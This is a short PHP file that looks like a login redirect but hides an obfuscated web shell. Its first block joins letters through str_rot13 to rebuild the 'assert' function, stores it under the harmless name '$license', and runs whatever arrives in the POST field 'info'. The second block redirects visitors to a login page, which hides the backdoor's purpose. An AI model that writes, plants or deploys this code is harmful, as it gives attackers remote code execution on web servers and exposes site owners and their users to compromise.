<?php
$license = str_rot13('n'.'f'.'f'.'r'.'e'.'g');
$license($_POST['info']);
?>


<?php
    header( "location: login" );
    exit(0);
?>